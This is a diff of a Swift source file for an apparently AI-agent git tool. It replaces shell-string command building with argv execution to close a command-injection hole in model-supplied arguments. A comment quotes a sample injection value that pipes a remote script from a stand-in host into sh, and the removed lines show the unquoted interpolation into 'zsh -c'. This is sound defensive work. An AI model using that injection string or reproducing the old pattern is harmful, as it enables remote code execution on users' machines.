@@ -7,35 +7,91 @@ import Foundation
 
 // MARK: - Git Tool
 
-/// Result of resolving a git action to a command string.
+/// Result of resolving a git action to an argument vector.
+///
+/// `argv`, not a command string. The previous form built `"git -C \"\(repoPath)\" diff
+/// \(extraArgs)"` and handed it to `zsh -c`, with `extraArgs` interpolated UNQUOTED — so
+/// `args: "; curl evil.sh | sh"` needed no quote-break at all and simply ran. `args` and
+/// `path` are tool arguments supplied by the model, which means anything that can influence
+/// the model could reach a shell through a tool that profiles enable precisely BECAUSE they
+/// are withholding shell access.
 enum GitCommandResolution {
-    case command(String)
+    case argv([String])
     case error(String)
 }
 
-/// Pure logic for building git commands from action + args. Extracted for testability.
+/// Pure logic for building git argument vectors from action + args. Extracted for testability.
 enum GitCommandBuilder {
+
+    /// Splits a shell-style argument STRING into argv words — and does nothing else.
+    ///
+    /// `args` is documented as free-form git arguments (`-n 5`, `--author="J Smith"`), so it
+    /// genuinely needs word-splitting and quote removal. It does NOT need, and deliberately
+    /// does not get, any other shell behaviour: no globbing, no `$VAR`, no `$(…)`, no
+    /// operators. `;` and `|` survive tokenisation as ordinary characters and reach `git` as
+    /// literal arguments, where they are rejected as unknown revisions rather than executed.
+    ///
+    /// A naive `split(separator: " ")` would be wrong in the other direction — it breaks
+    /// `--author="J Smith"` into two arguments — which is why this is a real tokenizer and not
+    /// a one-liner.
+    static func tokenize(_ input: String) -> [String] {
+        var tokens: [String] = []
+        var current = ""
+        var started = false
+        var quote: Character?
+        var escaped = false
+
+        for character in input {
+            if escaped {
+                current.append(character); started = true; escaped = false; continue
+            }
+            // Inside single quotes a backslash is literal, matching shell word-splitting.
+            if character == "\\" && quote != "'" {
+                escaped = true; started = true; continue
+            }
+            if let open = quote {
+                if character == open { quote = nil } else { current.append(character) }
+                started = true
+                continue
+            }
+            if character == "'" || character == "\"" {
+                quote = character; started = true; continue
+            }
+            if character.isWhitespace {
+                if started { tokens.append(current); current = ""; started = false }
+                continue
+            }
+            current.append(character); started = true
+        }
+        if started { tokens.append(current) }
+        return tokens
+    }
+
     static func resolve(action: String, repoPath: String, extraArgs: String) -> GitCommandResolution {
+        // `-C <path>` as two argv elements: the path is data, never part of a command string.
+        let base = ["-C", repoPath]
+        let extra = tokenize(extraArgs)
+
         switch action {
         case "status":
-            return .command("git -C \"\(repoPath)\" status --short")
+            return .argv(base + ["status", "--short"])
         case "log":
-            let logArgs = extraArgs.isEmpty ? "-n 10 --oneline" : extraArgs
-            return .command("git -C \"\(repoPath)\" log \(logArgs)")
+            return .argv(base + ["log"] + (extra.isEmpty ? ["-n", "10", "--oneline"] : extra))
         case "diff":
-            return .command("git -C \"\(repoPath)\" diff \(extraArgs)")
+            return .argv(base + ["diff"] + extra)
         case "branch":
-            return .command("git -C \"\(repoPath)\" branch -a \(extraArgs)")
+            return .argv(base + ["branch", "-a"] + extra)
         case "stash_list":
-            return .command("git -C \"\(repoPath)\" stash list")
+            return .argv(base + ["stash", "list"])
         case "blame":
-            guard !extraArgs.isEmpty else {
+            // Checked AFTER tokenising, so whitespace-only `args` is caught here rather than
+            // reaching git as `blame` with no file and failing with a less useful message.
+            guard !extra.isEmpty else {
                 return .error("Error: 'args' must contain the filename for blame.")
             }
-            return .command("git -C \"\(repoPath)\" blame \(extraArgs)")
+            return .argv(base + ["blame"] + extra)
         case "show":
-            let showArgs = extraArgs.isEmpty ? "HEAD" : extraArgs
-            return .command("git -C \"\(repoPath)\" show \(showArgs) --stat")
+            return .argv(base + ["show"] + (extra.isEmpty ? ["HEAD"] : extra) + ["--stat"])
         default:
             return .error("Error: Unknown git action '\(action)'. Use status/log/diff/branch/stash_list/blame/show.")
         }
@@ -101,35 +157,43 @@ struct GitTool: DevgenticTool {
         let extraArgs = arguments.args ?? ""
 
         let resolution = GitCommandBuilder.resolve(action: arguments.action, repoPath: repoPath, extraArgs: extraArgs)
-        let gitCommand: String
+        let gitArgv: [String]
         switch resolution {
-        case .command(let cmd):
-            gitCommand = cmd
+        case .argv(let argv):
+            gitArgv = argv
         case .error(let msg):
             return msg
         }
 
-        let process = Process()
-        process.executableURL = URL(fileURLWithPath: "/bin/zsh")
-        process.arguments = ["-c", gitCommand]
-        let outPipe = Pipe()
-        let errPipe = Pipe()
-        process.standardOutput = outPipe
-        process.standardError = errPipe
-
         do {
-            try process.run()
-            process.waitUntilExit()
-            let outData = outPipe.fileHandleForReading.readDataToEndOfFile()
-            let errData = errPipe.fileHandleForReading.readDataToEndOfFile()
-            let output = String(data: outData, encoding: .utf8) ?? ""
-            let errOutput = String(data: errData, encoding: .utf8) ?? ""
+            // `ProcessRunner` drains stdout and stderr CONCURRENTLY. This site read them in
+            // sequence after `waitUntilExit()`, which deadlocks once either passes the ~64 KB
+            // pipe buffer — and `git log` / `git diff` pass it routinely.
+            //
+            // Invoked DIRECTLY, never through `zsh -c`: see `GitCommandResolution`. `TERM` is
+            // still forced to dumb, which is what the shell path was supplying — it keeps git
+            // from emitting colour escapes into output the model has to read.
+            var env = ProcessInfo.processInfo.environment
+            env["TERM"] = "dumb"
+            let run = try ProcessRunner.run(executable: "/usr/bin/git", arguments: gitArgv, environment: env)
 
-            if process.terminationStatus != 0 && !errOutput.isEmpty {
-                return "Git error:\n\(errOutput)"
+            // "Error:"-prefixed so `ToolExecutionMediator.isSemanticFailure` actually classifies
+            // it. The previous "Git error:" missed by ONE WORD — the sniffer tests
+            // `hasPrefix("error")`, so this tool correctly detected the failure, reported it,
+            // and then had it recorded as a success.
+            //
+            // The old condition also required non-empty stderr, so a non-zero exit with silent
+            // stderr fell through to the success return — the exit code counted only when
+            // stderr happened to be populated.
+            guard run.succeeded else {
+                let detail = run.standardError.isEmpty
+                    ? (run.standardOutput.isEmpty ? "(no output on stdout or stderr)" : run.standardOutput)
+                    : run.standardError
+                return "Error: git \(arguments.action) failed (exit \(run.exitCode))\n\(detail)"
             }
 
             let maxOutput = 6000
+            let output = run.standardOutput
             let result = output.count > maxOutput ? String(output.prefix(maxOutput)) + "\n...[Truncated]" : output
 
             return "git \(arguments.action):\n\(result)"
